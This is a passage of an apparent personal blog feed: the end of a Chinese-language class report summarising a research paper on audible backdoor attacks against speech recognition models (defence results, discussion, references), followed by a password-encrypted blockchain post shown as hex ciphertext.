下降了近30%，这在实践中是不可接受的。此外，基于 spesub 和基于 wiener 的防御仅将 BA 降低了约 3%，从而减轻了 40% 的 ASR，这使它们成为更理想的措施。然而，SCD-30 的实验结果反映了另一个有趣的发现。如图 4(b) 所示，四种防御措施并没有减轻 DABA 的 ASR，而是导致 BA 下降，这表明 spesub 或 wiener 等典型技术在可变条件下很容易崩溃。</p><p><img src="/images/opportunistic-backdoor-attack/image-20240113170127548.png" alt="image-20240113170127548" style="zoom:67%;" /></p><p>（6）微调的阻力。为了回答问题 5，我们进一步将我们提出的 DABA 与 BadNet 在对基于干净数据的微调的抵抗力方面进行比较 [22]，这是一种跨媒体通用后门防御。比较结果如图 4(c) 和图 4(d) 所示。从 SCD-10 的结果可以看出，BadNets 的 ASR 在仅仅 1 个 epoch 后就从 94.88% 下降到 1.48%，并在 20 个 epoch 后保持在 33.41%，而我们的 DABA 攻击在 15 个 epoch 后仍然高于 60%。此外，DABA 的 ASR 达到了 80.99%，而 BadNets 在 SCD-30 上经过 20 个 epoch 后仍然为 43.17%。</p><h3 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h3><p>被忽视的后门。当前 CV 和 SR 系统中的后门设计需要对手现场播放一些音频来触发中毒模型中植入的后门。然而，对手不仅很难在现场保持在线状态。相比之下，我们的机会主义攻击是即插即有条件运行的，这避免了不切实际的存在要求，并为攻击场景（例如室内、车内）提供了更多可能性。我们认为后门攻击的标准是不经意的漏洞注入和条件触发，因为它就像蠕虫一样，只要条件成立，最终就会对受害者构成威胁。</p><p>攻击的调用不确定。诚然，我们的机会主义后门攻击是一种不确定的攻击，可能会长时间保持沉默，并且不如主动攻击有效。然而，由于缺乏昂贵的人力和设备成本，它适合广泛部署，这可能会给用户带来更严重的威胁。同时，伺机调用很可能会造成不易察觉的损害。</p><p>结论。现有的听不见的后门触发器（例如超声波）可以通过预处理轻松减轻或注意到，主要是因为附加设备需要安装在附近。为了打破这一限制，我们探索了第一个用于语音识别的可听后门攻击范例，其特点是被动触发和机会主义调用。此外，我们通过基于确定性的触发器选择、忽略性能的样本绑定和触发器增强来发起机会攻击。我们相信识别此类新漏洞可以促进 SR 系统的安全发展。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>[1] Stefanos Koffas, Jing Xu, Mauro Conti, and Stjepan Picek. 2021. Can You Hear It? Backdoor Attacks via Ultrasonic Triggers. arXiv preprint arXiv:2107.14569 (2021).</p><p>[2] Peter Kairouz, H Brendan McMahan, Brendan Avent, Aurélien Bellet, Mehdi Bennis, Arjun Nitin Bhagoji, Kallista Bonawitz, Zachary Charles, Graham Cormode, Rachel Cummings, et al. 2019. Advances and open problems in federated learning. arXiv preprint arXiv:1912.04977 (2019).</p><p>[3] Nicholas Carlini and David Wagner. 2018. Audio adversarial examples: Targeted attacks on speech-to-text. In Proc. of SPW. IEEE, 1–7.</p><p>[4] Andrew Varga and Herman JM Steeneken. 1993. Assessment for automatic speech recognition: II. NOISEX-92: A database and an experiment to study the effect of additive noise on speech recognition systems. Speech communication 12, 3 (1993), 247–251.</p><p>[5] Yunfei Liu, Xingjun Ma, James Bailey, and Feng Lu. 2020. Reflection backdoor: A natural backdoor attack on deep neural networks. In Proc. of ECCV. Springer, 182–199.</p><p>[6] Tongqing Zhai, Yiming Li, Ziqi Zhang, Baoyuan Wu, Yong Jiang, and Shu-Tao Xia. 2021. Backdoor attack against speaker verification. In Proc. of ICASSP. IEEE, 2560–2564.</p><p>[7] Tianyu Gu, Kang Liu, Brendan Dolan-Gavitt, and Siddharth Garg. 2019. Badnets: Evaluating backdooring attacks on deep neural networks. IEEE Access 7 (2019), 47230–47244.</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Opportunistic-Backdoor-Attacks-Exploring-Human-imperceptible-Vulnerabilities-on-Speech-Recognition-Systems&quot;&gt;&lt;a href=&quot;#Opportunistic-Backdoor-Attacks-Exploring-Human-imperceptible-Vulnerabilities-on-Speech-Recognition-Systems&quot; class=&quot;headerlink&quot; title=&quot;Opportunistic Backdoor Attacks: Exploring Human-imperceptible Vulnerabilities on Speech Recognition Systems&quot;&gt;&lt;/a&gt;Opportunistic Backdoor Attacks: Exploring Human-imperceptible Vulnerabilities on Speech Recognition Systems&lt;/h1&gt;&lt;p&gt;Due to it is class report in the final exam, I will use chinese to write this page.&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>blockchain-distribute-tech</title>
    <link href="https://wd-2711.tech/2023/12/20/blockchain-distribute-tech/"/>
    <id>https://wd-2711.tech/2023/12/20/blockchain-distribute-tech/</id>
    <published>2023-12-20T09:09:03.000Z</published>
    <updated>2024-01-19T13:48:38.509Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b9628926b519537df613c6f7430c1c7ac59fc6645d92d7e824401a5bf13e1503">2c151d14a1692af99fa0c574696ab642630118ededbcd92b05c804024ee0b0d55591998e1c70c4b4a03568ed6081c183b2cb8af7e6d48bc38864239ff4ca252bfb595d924e17bd4781ad9b113dd8bab0a74f98ee469a5ea8639029680d19816e7924fc7db2b034aac247d61623a66008d75153cfe9b91f9ced195e9ff38e38d8ef27533eb3aae462036804f67ce5a70dfae5f996f6666a0ef7cfde0dcf5dabfe03023e588ff6930189a95527467f00682071075dba91ded90b71fd24f03e02e73958d3661e059ae06f248179edec019ee96e4ecf2cf6dd7c649c6a5729e139e371348e50d381cf4b117c0fe0a3ea8c52de031fa5340f7596a1e6e2ceb3d11d988cc513440402123cdb8d3872ac5943ee6c411a207f53676c7213105226b81974f902a1d667d6ff4511aeb467ef8ef5ba28d909e2e589ecb103dc31d2b0f2dcc53788c6fd1485f7eedeb948c2563f2fd7c4521b6c0d09f05896fc2a27b519e4ec8e134a75b022c1cebcf3de109e8b1978884cb43b5927de60281e171968cbaf206a54866938b7d66d283ed323a1a70331526497be96e5954126c9f7da1b99f41758dbc606ff8bc88e1036b0ce1d2e1c0372b557ae8d6341153c3b6dc36da46dd884f1288897156cee5f7965f20bc5f8babb6067008597396cf5a613589c52837181bcbe2daad14c9d3494f113fc06f6332ad3e498ec626b6b3892dcf1d8c5b22773c9e538d9aae952b4d3f6f40c794991a322699dcf6654219facea7f53b0ae7348491b3e19861dc2be5b435f9a8b57122685e337a0c7da2d1a44c1e1f00fccf88d883ce66d186ea21598fcb377dc7e194ee82a0276ddbdc338dd6d1223179bcac4aa7afd4f02ee258e9df289ca4bb736dbfbb2f3de435d761f2f933c75908769969e1c5ef2ee8c43af576b46add1f888a050eebcaf7eeb699f533229fbdaeb4561f6c2d761bf7ba637f196e883b466fa69c6b22a76978a78e81afa0fa021b51472f66049ed7b992f99ea2855d98ef57c614adea481c40e00f105e8f0770a81c384b5c2525799c88bd4e814e15648dc515cacaf51893a4600aa6581b8b067ecd8f08fda13196d5da59611fa972afa34a14b7ed8f96ff38ac3ff9e143a083e8853ada970e3f01f1ddd26022190f090a9c231f7b98197aaf0c6dba9915a66a0a6e4ef1994d7afc333ce8e2902ec7738293ce4a98bd8e62006bc4610a3720573ca2a0126e01e255fb54650a2b79c27a5ad592809255f239bdf219488293f502d86a3e66c76fadb948c8dd3edf04d4b53406e624998d31924800d8f4327d4f5413410131cacba64c974763dd7381966098e85ec50a64816dc9c41c495b7b1300be41ce2b4da206d4e5386f8f1e2f51c635907bf8a255a19b1b5b4fb6bf17f63d48545b1718cf17403de4050752a654e8ed79264158b15e08b3a07b78881924e6f80d37a884b6e3586de9d4ca92816d22e70e1600e5fe6e85ec4ad1ff5480b329e1b2d9580e793f5cc99c746c9b1260198e0daa3c593780c74daf66ebd9f8ad51b88b3482c1587f885da8ce52e08dd5e7d05a2063187eba0be52d504c53b2f7768e0fcc8a911327993cd826d997602915d031d225a744844cc54ffb6e990203c660a000521d195cdb69331851cc1dee59e0e1e84d324562ee01ec18cbe4dee38d8e63e3415ec2c6125517b2d91159487054e7187b967be1a210f8604bcc67fd2200d14fa90290491646413b629345e737a604f65b96d95350d0f074f43dd213f81f4b30c18acd339261de3f3aec0863f9a6ec809c5a4283aa599861cb69709db3467e1b2349bf4aa1bf1fb2fc2a91228d8735447085acfff4cb67b7471225929e98038d1fd6dee41a2fafaaf6ea65a4240b3795a0997218f41cb67fc74eebdff8ad1ef22a8e6b4b73c07c068e23393c916069775ea9cfee051528000b9fab58b2ae0ffb9442e9cad4b5b0ace2118fd6f9af7e8cba31188db90a318ffa537da3e5dd8c19cbfdc86b066aa022b9075c495a67719d35e1513745a59e367ad0fe2ce9abc394f6ff4d3256a43b75f374eafb3645794477d29a90219a1a80ab0c5ce0323d4360df253a0df8ebb1ff239e7bcb38de0303192d1245b4dc86b40bca2e54dde61d798a1de04c38523ceb41bc79ba6538c2df31073d9ea120bb0f051d065c60e771fa2a4e1344d302b7215ac3bf3a0f18274a359b9c5c5901b9fc438c3c893a15db8c7f8512d3b5cbbc4e6755266f979cca1edd75350c3b76b2b63e01cd49da291fdf6aaa047b1d6c7c6c1f1ece9125c0d96bdd3bceca7f4c4b0b186a909ab95bc63f1cfed326a1d4b4cd8974cbba3b2c78c880db8af0837496fa1c03655880eeeaa00fe907c5da6c6a5627d72731cfc97b3217ea7a81852204101df20702cada25c3f7b12d1792debad71f51f9f4b62a16f50b0f4e1b274ca61edaab814a87f4eff60c3262a157e26e344a1fa1af2f80b9df0279bc05a328d31ba84fd22442ed1d71f245dcf3a78412d094bdc47825cfce9eb3fa7a7e96f7b8f1b441356415df7905bacf6a601543d8769526377d8097e68a2dd8a679b9b56ba31021cf3b85c5a4d8a198e14618317b8822707b5c1e4fb29b731717077f7ddca75b44a055e9cba7088c6006f14983c5d9c94dce27c21901ac216a14a4900259980731214f970c60ab579ae9fbfcaf150d7bdcb6759e1982aec46177d61db712ba07cb64b511243fc7a6a463c1a0816d71840a2db8c6155295ef510529042a318d87b56eab0121bd5ed19ce09760d9ee08800b0a5be469f1af9e8dce9b4a3358f1ba72f02b4e501354beb388bd97d2d622e9751804d57459789f32caafddf1440eeb29699e015c3270d593461e24f2fb8f561f65e9bafafa34a9f9f788504ae6865c1fdbb7c8cb71c7470c650badb694beeab1dc4cd5f76732153009a93235ae6c645a1d9d70227d7175648c73932dce69a1c60ad5103cfa12b45757aa09fbf2092760be76439c807c228cfd97bb9ff265fd1ed7bc1f3f68f659faa0fbbc585ced2e032ea3257fe04f7a9c1b905c2ba276f31d89bfbd3010000995d57ff96dffca84673cf61b1aeb2e01a126d88b77a009785aaca1c7fa16d6bd3dca1412bf7928722a9398b13e5e7415e00c8d2146fe498b8a0ad79596ab31900167aedc1741bf9b819bc38fcea75a7066c9ed13309df47e135f3f4e8118b254f51905d083e25b5e44174ee5f96f07f1f928a867cd489e9771ee892fb4741246d59e5cb730c08552cb72244914355232c7a05d221f7d513a70112254d8664a6c8dbed6b9ba60f371acd4118a83e88b3ab0d50e39e8d634ac32c91adc3b42482e9668e41c0b6943358f48dd2b047b9c23fdb80e58f3e15a8249d79ce442bd89de3a26fd71a3e19f7ac9f9b4b1801db048d24009b9f3c577905a77d0fe01cc998eecfd89d02ec866f3c2293e3d43f1c24c7db925078511fee6845c9b11c31e6b133488c9adb4032f98bf501bd93710c1429e24edc84e4f85ab6ac106a39a5f49244788d754ff5c4c835692e9ac4c0ccc3acd73087965ff084aabd5c8c8dd3d5640493367d35811ad0e53b31ed75571b6fa95c4a6d3f50b710461c458954ea3f8e177b8851d2dc833cf7fe8a5de7dc53cce23990e15b1d8db9447fa7341daea556a7c90ace3baec35bc464cfb51296b289db2b0c513be63e01e36f1faec64ea99f279a6dcd46680dd6ad72d2efe723d4758f76a7d1487e49cce534b4bdd1409827418bba704901fe912e4c84199246c5276c6a70be1ab82bf3f730309704658a5f408fb2c571748a44442834ac22531911802a6b077e220f58abc3e9f90ff4b1984a4bf076017f513ffcb4a38f54bb49fc4b4252d526bfbcbe6ebfda905eb61ee2a62295e9b65bca7516e18f2b116f75f8d4906200bc0d4f1593358a89ec4c4bfe2cca7331a05822df94f245613db9b06040b4f28cb35109f51404609e43e853bc4eb04ab1f81fb526fd9c6ed39c30b2e4d6f48fff35f797facd0d10c1b94ecc661df271b0200b3f7a788481e5b073bae38ab25fa29b91bb31bccfb4c342458da7aad30ef39ae193c409087ef79715bde50f1376f0654fac667c698ef7452e045345c5e3891d4610d8f9e09ef4faf6dd243116b9331b7c12cd5df1d29d0bf5c8b3175e8da076d9a4466b2f782a2c1952676563163c5af572cbabd03b3ef134ad24ddb9e71c552eb22d878270bfcd01adfa3edd103709c1ca3b445bd6603720da51a68b63c38853ab715932ae5d7a01b49170f637891246d5666043b6a2a481be70315efad8e6d9b1c2614568f20b17dfea383c90f2576afc9d268d641c837ff14dd6a3cbcd6b4054deef0ad6861b7bb900eb71771afe9d6e58206d3e931a61cce0785fad3df5a033c421c4ba71a38e20105b40b2e5df5230575f735c709cf84a8f29f5c2c1062dc06227a38329710ce8f92c9eca1a1e3ce267532279a24b20adb77dfcfa1f5fd9daec5e861e19e0fdd7b27fa5a0106f1db2ad7bd84f787a5b83e510f3c2d81fddd01bc215d1892966e305746391bf59d5ab5cf5f81bb8c5c7f0023173d17fedbe107f1a261b4193fd195507ef4383bb55a7a77a4a1891742d9c3895add55464c001256cc2122f6658a8a7ac32dcbd97b8b98d80de1a2b64ed59a261c7c7e5737d3c43b1c2bdbd33b9516d021765e9ce3eab014273a2ef7ed538b8142c186d1578b3b332d8770e65e3ed62e1f03e76c746eaaa6039af3bc631b892785b14032b399d697e67ccad0e3ee5edcfcdec4c6ffdc7cada61b06bad5a1354af54787d6070ba8eabaf921faf4926b2e6b8e87b22300b57c731e0a29f5908fbaa8f5be09db6072af675c33cf389a791b0888758767624f6d0de65db5522bd6d71b22ae9848b8b91509c6c77ef8a5252607d4ccc4990020169755cb9a7315eafd06b2bbe42c7ab962714686d24ced1de39543da9624f8009c6e2e0bfae11b685fd575bec4e95fa6862978b7a75c9dd22a38d211c0bfaaa711033314ec3e42359c0db525cf2630a5fbb136addde5da73ae0a92103989a8514a058d2b8cfb5c9ab745755a05eb88bb8ce98470c09a6bdb5a180ff4fa1de54a0330417a45e5e522e56818ac7e01f9c7cf79a9b681f064b4390f1cc47778d9b313657b36301a4c4728311e992209fff855ffa42900240761cd8d60c83df32936e006790e3416480dbcbcb08272f2b79f4f40cba09f152160ca499bf029e16607e092146ca7f3b0fa969daf4d7df6848c6c08a0ee6d4b485927202ca76c4de30b0392e3a4c7f0ca030782efe5e71d05f31a991409ee79ccd18a76fe8627cef988afe187bd55d77798890a2131eb101455cba963461154d4e402015c0b13ce338eaad4c8cf9fbbffb78d356d69a265a5b91acd8e3bee3f578c8b506a4a03be9573b8361a236c2681411e328c85c1bf5a7b5e5d94dd32a6ef7f64a904e2e49357a49e27dfb0bf3cde5323f5938524798af6c3e86d23ab367c1f7f473792dd21674769aebe9e24f7ee16e750ab42976d08f0130693342f46819474697b3563e72904dedf4cf3af5a4dcbbd5f6b29ae1ebe589867b73aebf80c0c655ca2bb4e1fe83a71e93739b4f95a365cca1c839410bdad056f350d10a556239d608ef7c4c97399bda71a689d6cf4db361d9896c23eaf75902d99d678cb3b32584c6ceab788f88a9bde7930641c5c2ffcec70e41c63aaabdb38c69c31894ba66c5e22470bca68fbddbb0e5ee92f58b4a0a998569226c76394ac44d00e3e26f09f2800c08fcb3347242cbf0979bfedd272809895dfeaa92c3ed2f18e424ccff548b42216f7d600ecd95d603b7a32f606a8e1526896dfa5dbf726f87b4e71f3ad9359e7bdc4ba6125e6cb016440bbefb93f11cc75fd4e5d5be55dd8297f927aa4d7d85d48870d53f63fc1087764ef3b26744d57b9c022513d17957c8d7e0877d055021fdabbe386aa38abcb0f58716d4d3627ba58b5c60ee3c75273b3ff24d1a7d0a23c35e3a610f4933335e1379bf705b86107fabd72d55aa88850a9e65ffe1ed95f4b110fe078076900c6b387ff52d36c018a9dc836dc95c509168ae22a0e7a22624a658319746d403b1e792494551ef12dfa3954a13dcfb25cfa815fa408e745642805ebcb4678cbd30b05211166cc2d430a28800240987d7aadd1ac4e7c94238edc5e7e324caf7a0f1166bf40e1a0737d9fcf25c7b684b9e975094df650eae2ca2cd0362b9f115a94f3da03245f1650a75e3c7254eac0b4ba7ed9b068525895de4f78379a558209db01576ef2387609e675d4239dd679ac25e3508dfdcd16933120d203a1e732e3d0bed2cb5d9bd9a85c86f2475ae2b2b1d464184cb09eb83cb8611082590c1a4a539e126dd274f2f77e9acd0732e1162c44e48542d8d749c61491945cd4c4c9ab5e0ca5c51668526b5e0bceb5598c3cf940b242dd959eb7c2a9d06508279f8428929328b8890d72e8466f977502e253e0204eb7f7b7808b300bc27eee2a8ec5114aec813fee48024b9e61bc0b6d649050446485256ceb284bf798b292c516793ae76ae782fae49765413eb97e1004a1ff0f198bcdcc989eefa3738aa7b4b11e14d81d53ed4d660e70f4032c696197e10f520d7ed47f09f3aab8931c211cdea709f675aff9cd651f889af56af3536b235338b5fb5f2f875a23aa44dc2a01abfbd8d31fa2d90d40dec674a076173b99358ac35036e3a2ce56bdc3780a7f8bc4296bed9d8aba0853ecacbe968b7e3113cef98a3f8c80083480dea0003c5ce7ca4c32b2f6251fa8b58989c74ad6f77089e01c7b70f67510aafee732359c25afaf939b86e6581697a33bfd1bc404aebea93b55709fea3779d489511538096f45e27a63eb0e847ee15a43f359cacce0f26354ebdfaf4d8d5981d6baa370dc71d5b732b06b76cf6d7219d1d6b47083fd068c1167a774b403945cc74ea1109a7b48cdfc2e68877cd513a32ea3fe0c47b2950944ccf2bff2ab3b359c4cd7cbb3f2e5657d884a26580a1d482c8dd840e4649a2f671f10879269f0b5d94eace261ca66f0faf11d5439e40180ab7f027f449b1d5d4c1798c3b14f5118e610371c783003c9ce515ea7e256430ac19cd646e13cd3154449ddc12ee71353ef4d93951d31c50104201a771106da1a3cc835455a1efe3caad5c5167bebfa1affafe4b42c33be6cc1bec56169bef3e4f1ec438c93bb5568a61f26f8881ad55fbd4e9210c8d5dc4319c307f4b1ca098294a45d7d8195d029c46d9c5d270dfc18cabab2a639023d01f53a64ab74598271b8b1c01bfdaf0910d4821543f92e59753e952a87285d92c4e5ee80915cf9ed1a628bbd6c94b4e0c726822d7a2a3f3047e54cb5e7d1740ccdb47104af44f02cafe5613c52d7338b44e187f92d1c8ff6f1586473528dd456cc72dfc74858122f4cd203004ecce8de0ebf5b2bae08f5a01704e7dfafd48bde321269d5b3a90f26b64f8f9432319f6b6865b5318547beb5ab51ff5a7afec90eec2d7b6d1cfa949c357d7077f446e4dfcd4443687b95a84005c7ddd5cc756477d1238aa016f3e99b2cee736c8f0e285acd611a001f6434d1a1b3ed5a3dd12c6efdf4069d881f0fba8cc800ab71f839a265a4017f7720c483bb5e40fa337bcb1193702f60786a3b0ff4b9acdd7ae981841a1ea846db62ed6721c018cd58cef791b0ceae2abb88344a4edc3b171f23b7fd9f6070dc8595d9bfa4129a9d50e8044cc7c5b0d2036509ee07f843dbecc4331cb2c5a7ab824665ca0e671ce2234c8907e33a9534fbd5bd795137e13b37289cfb7bcef39253f74711629784811587416a32243151deadd730451311f28db319644e7e7ef9fde6408627413ab3458f931f1998ae2489a978a251c1991ab4b06b60272b4b64a08a2f2fdcd026daee7b36e44183be02c2d5c6c48e9c79d0631789e192415282550f3bba13ab031c416720865772ee8dd505f079b321ab708bba804a364260d624352cd7383ed317aef2dd71d66e1beb35674963d425db3035102a72dd443a46cd6c6b21b573ee48655f6caef7b4009c7ac68ffc3dbe07254d4adb00a37a7f3d50e4220f81a08b575172052673d2c220dd49f62087f4a2622588601ab65a57c0798a1d4cc50663b20207d455cfcc7b031e637eb2ae0791e26bf482d8211397fcc80d79163688a24bdfc02077ea0c8500cdb10eeed44c531fb128a86d59747c4ef51e265520339ccdbaf4ec30189719d789b279bf1e7ec4b27c138524f4b8284ea77c249c39ce56b9d14914cb38a262ffef8c59e8c7271c4ffc6812db0c74dad0e4be0a503585c9cc2ee400a4adba034815874631aa0040200adebbcd84c2ca65f94a9e50c86bf9f2667b6df09524ffbf51ccbe8ffc0b366d7387f3219855b2698b7be4fa3f7bfb6c97738f4140f0ece495f728fdebca0254835b30e94f339844fe89563589e06e14b07b27c5baa5cb9df2bde0e8bd0a1d396c36b3d97f6b344f7ffa9b9801dc24813a7355bba4f91f5e684d9e5d7aae227d0a4174a9a0a418121fc25ceb950889015fb7ce76efbdfa0d3997e22cf40ebf71c2f64976fd5e21d871e0109d02e09cfd53967fc40ea5178ea9446feb537cb6eb8d38673e68752392e38e559677bb1d3a775a2a675c163466946204dec199638a1ac1da3431ecedb235761fd9e43dce8c6cc604378ee583a53340f4b8e8eaf499f89ab5661dc9c80fc3246fd5d52bb77a8c5fba4742c155a4e19b5abb9287c1c32edf797d9ff513d2b1377c6973ee33d9967809c9a13d0fad88bd1905f86b806b9b0a53924ce0abcbdba2fec656a1f6602dfba51c676cb0f6e09765442babd30713d58279d9a2f098269f4e88759f6c2ffdd6b5dd770b4ad74681bc167fe102ce5e117dca89c32736a34693cdcec085f0cdd4034413d41faddac4668c39e877c5fd0303424fe24d54f3a288d5570b33eb43baf930e56e1455ca437fe9a842106461aef3e951aaf3408781ea27836e78bda71488d6312121c405c21ee80c21a00b0f1ea55611684715a19ad03e5a4dda3a973ea86629679ddb119df5ebcbab45739f08f39e00500be5370d8870ec2fa7db334b312194899631daeee83f64dca1663a6f39cd4407b3f9f1077907f3b8e3aeb4fd4bff2b1c61b6fa110d0230759a4203ac105547a82e551eb8aa8aaef390faa723043ec46d1cd8ee457b52918b8adaefde51d9642b1a76cbc6131c6ea3f42796197fafd9f0f703b3caf88396a1d8b140939004f778008660e36e0ac67ec79053f043c94dffcc541ce30f96783ee518ccdd8fbf49b429a1b3bf397060d016b9384e0258f45aebe56155c3d4799a05871e6a72d697106d0c452f5c00be4950bd9f913f1c07097add6a63891896ccc46fed1feb92d486c15fb122e6f18db61c747d07d7c27beb57b956debe98e5973f70e0c81e04e1cb51a743b5e1f0abcce755679b8259dd5b2ad42c6367ae6359d4ab107b0a10115280e65b377dea3ca03b2e5ffc2ab1fca3c2affba80a781d6f2ac4f6f6cacd3dbe4e1168532af41b914f14ccee78ddf96cdd40fa3f23b85a2ad09f48a8f49cae50db6af6086f16d8292a7664e544af2b07554138cc79acbc8dcc486aac7be78daff10acfed9251b4022ac7a11d2c1d0eaec4654b6b449428324bb6de04a80b103abcf56f06e71e7749b46d57eb2a4359ae431e859914e6baf807f25139dd559972d78f3780a02cafddd2c98b9a6b66e621155c6adce62b084b72c8bb07ed03ade764198e6b0bffee8703800df03f7b0b7d62fa81c98326cdd4dcc41e45ed1d05dd6fb63863cd88114804e7ef633d1286805cde142ce0e7e7940cd680e3dc81cf7602ac8f6f8c839faf0730d87945c4eb2933fb95ed0f24a9e6f2cfa6728361e1650aa58c140dc8a6efdc5778731b577fd5337e199d5f02888de9e5458f360d31eaf5db7bc85ae90acabeae8e726fba42d5917f9985043f61cee915fccb6194a8519ce594f354a1c3ec4bfe54fe2c7a8fbeb1bd20ce8f00c479a61c8377941ef044381b8db31f002a18963a0d688893124f8211c6dbad14e8bc4813936d1c4c93ca647fb3ec4fb95db6cc83a5fd77b7e7d862a2c94075f3583f60da070d7f15a387cc6cefdab63307e5cb1f2d281fc49b55474a748f12702e5e42156bc2a05f4ba8ea38bdc1ecdd7773e806924f03c2081ed2d4fd4019ed8601590ff70ee197ef9b6889fcb071a4bdb2bbac7b86a53b6563974768f13196d5b8a0a202cf7237e06ea0b1b19d53549162be0d5a3942fa6df924d33ce79f6d3509f7583cc131ae96413989bf881d949ef796cb8ba1acfbc0ee2fed7e246004baf44c0bb70bb4a36936a349f08d32779925ee637a4375c3c2d565ae3abb1e9de3cfecaf8e09d29383acb9c67cfa51909cadbde1e61d96ecf44fe3f4db9bb840b75d771cd12d36746215b320990be64caee77307310bfc4914d37ba0a517dabe3f9fa5fa4be5a2fed01abf168566d6600ba1be3d278ac707f181974c7acfb76482597097ab3b9945ff2cf42fcb5b4079544e68595be767cb3f4b99f6b2b0a01e6fe8031ac58693b83e009bd4bc9691a8600515b18845c76a2cfdf942fed9b3f7d097d6f3e3e99aeb4eb4b4094c051699bd56785167f2807eceb48634a417ff61ecee24d78c285a1abf0c4b290a06d38089a2d11a345c4902bb4205c0eabdff49e2b539d1061170fc30717aea4e354c9e98fce2a5ed8b52782058557d4832dcb926fd9dcc919ef95716a1dfbbf1eb40a9b34d2fea2c8a6f09ecb862d96137605b2417e3f660c4910dc160844ae48196a38fbf2110c6f9d1d89cdbd3bdb721e65fb3d9432cb6b402038537918ab20c7c13a478a07ed188b06e0a737c7e93ab85090d165909e03f4cd1487ad23152768b9f652cbac0dc317ba46a2ad3103b2d0fd3fbcf31e091d236ae603612d5d51a413b490b289ea01d67a29c5b242e4706cf424a83122c473d296c075df565d48ab4f7c2cc9ce2d264c00d524a28958bd935b1f843830fd170620652e0f75a5e144221e55aac2c0e8cf88bec81f8ce30752a22f31c12ac1357d8f4e6ba3a7dc5f729af9b8612e351553324ddd310da91635a8970653a21504912f645c9966c52cf477fee11a5a2fc94bf0b05cf4633c6108e4b8e62fb1999298f2d98815f61b04c18f839882e88212809275373e18a94a1c1d9a658a4cb794a3661631374ce0b323b4fb94fc646dab3df399d9d761047adff5e6e540c14289387c7694c8a1bc188e2de3b1a923d57b52a7b4afd0dc2a60382b0f039bfcb9e76bc808ac7b68a30a72b4bdd2f6304ae2b83a9f043316952384e75fdee1ca4687cb01c738009f19a7acc8e8cb96b35595b4d647ef1e76d5751b68100e0e60f5951fb8dcfb31413aec2508e37c3b37b68c819726911b994a8e8ef92476b0b0f055999928b6b149fc8925941a9bffa264fd7f08aff76180222508df6af543dc2a0caccec6c0dcb5960ba472530d4e38943e5e43359a6dab3ba08f57d245dbaf9929e7cc5e4fd435d9bbc77eef7defafa649dcaba73b9152a3ea23a2424028c93fad46ef25c8113047e2e8e4d788750de9bfac90d5940a36caeb1e5a03567ca26e0dc3554e15eaac6600d9aa61eac67e9e14d1b01a9dc1536e9a85c6b3ae8d7f279264610d35e7338cad7af592f6240ece5b1e94d13f9f2147fbb14e7d3e40ad790a9fc8283cd6a2ee6917ab79273f62ff6d819152dd965327883405175e2a71d64b4bfed58c94306fb64a81467dcfe478b05c5f01a4475b64caaf24abd5e935021f57292fac37ceb8c2a72c3d0e37b33643f058d645c1bfb5efe08e1de8110696b6dc2b311f5d11a0855637c094c994bd39c5d3180657927e83e5f9c4cdd8e5e69c47b91716223cf401a0f8e45e495a6031126d6094c26a50adeff282be44f0ebf005df1e1424f1e7090d0c1c96b68d31fa06ebb6cf62e61522a37a16e279a93b1ed9ef594fe385e6bb0cf8d400f73918eb759b637db6e966206586d791ea9f13f61fd11c8cacb1b43445e6c477a77b289c0a954ab04f8161cab819355c09424d5e9afcb9dda599402fe1d9daf142024fd22bbe1886dfa766b3662a5910a37ac370ea1d298c93499f0a00d706e60e89cf4f030919ecfd0decf73cc7c7ac3ff034259e13794c62502928a1f8660e6789c72641f28758bb5708757e85511c3ef6d1c7e3765c96fed0aa584d1223f84fe7d34df5548b9dc6e01cbdb868e8c96bc9e32c3c8ffef2d1a8dcca06fd73635db8ead6c903c822c9bac6db23f6f36cd3b9f52ed0687e3050c86687fe2f39832ce4ab83d004458ed8546b2be79340d9f78fef8db5bf87d07b5104967f560fd189eb60908eaf7f7a09a95c6b2be3f12359700a4c03237342638e69ef60c970139d910b516e706af4528e202e31438970bdd3fb64b05de100ad66a50945311be4aac11ba6a57f87af9a738d81ce3bc0f63263008411d55694c34318fd5485e2ff070921662dac8b6189598d544d7c3f7026ee59d889d3529caa3093214c4149e19140ad4717a3415c328e018c7b750d9f155be51284725d484aac5b544a5f665210fb805391af177dd67b45120d3175e09dd41b9c2bb6a12150312a1b5488399f0f65bfbbc7aa7ac3ee45fd1e3c7da1e976059a6c934019ba4cd2cc37166a3e1d91d2841863e5836cc47cecf16eff1bba9685dc01df33d263fa61de98fb0f4bfaa5fd5f5af2ca26ba674fc91c66a037cc2831bcb91321197b7a17aa979be2eea55a1190e2d981811e7809db735f2c965549e7c7f0a8ff5049dea4b18796553958711ba35fdc81d71405d9165e1670607ed91a1dcf61ed3132f325ec7ce99ee99e95b6ff29d21259462ac7c178d535e35d1defd1cd617d5817fc6383475b13a96494c03323fbdb88b9a1c959e4c45f0c0d4d56f3e307f8338bc01e9057ed24910b6bbfee2772d69d7b6f4ce86ef66e7bd0f10b05c19457a69b8e8b5d1fdac825c13e678cc4d2f480c4d1713667917818417c2278a52fced07da3035ebbb73b004ad01b90b2036f7f8a8c5f9993301b8c01c14529901b71965d22c554857f0f164ef8747de9999d7bd7b85c9359013c2c22fd9356f1ca07949274246ab00dc41a6e4406076e2ea5523e4825756ecdcce74fe8c75ad437f390f5e019e09adc760d9336edf2780c5e0d06ac2c8875ffa39a771fa2e71fee915169400d1f3ce9a812c2a41f967fcf05b3ba19ace7cdfd73812047a783be4207bd88cea3ce43db0ead51aa9970fab3d73b21536ce3bf2226609dc565d77689542482b190cc99369f61aabd683ed994c8077053de8aa3c9e04d630b5b8d5e292dffbad118259fad86a6bd3e1eb9005380b83ad6a25483a4881510fa7fbad05dda2edd40b69cdeb697f68e51653840c5c117d7a2f7b3455fe30c6af74f73cad685df9be7be6918efda29f8cdcc4cc296fc648fe3275e978319d3fde6c007ab695123166ed6c663f94704b8d1a9567bb28eda9c5322bf9da586704ffc88cd7f2b6f599decde852dbb2eb0b6cb1c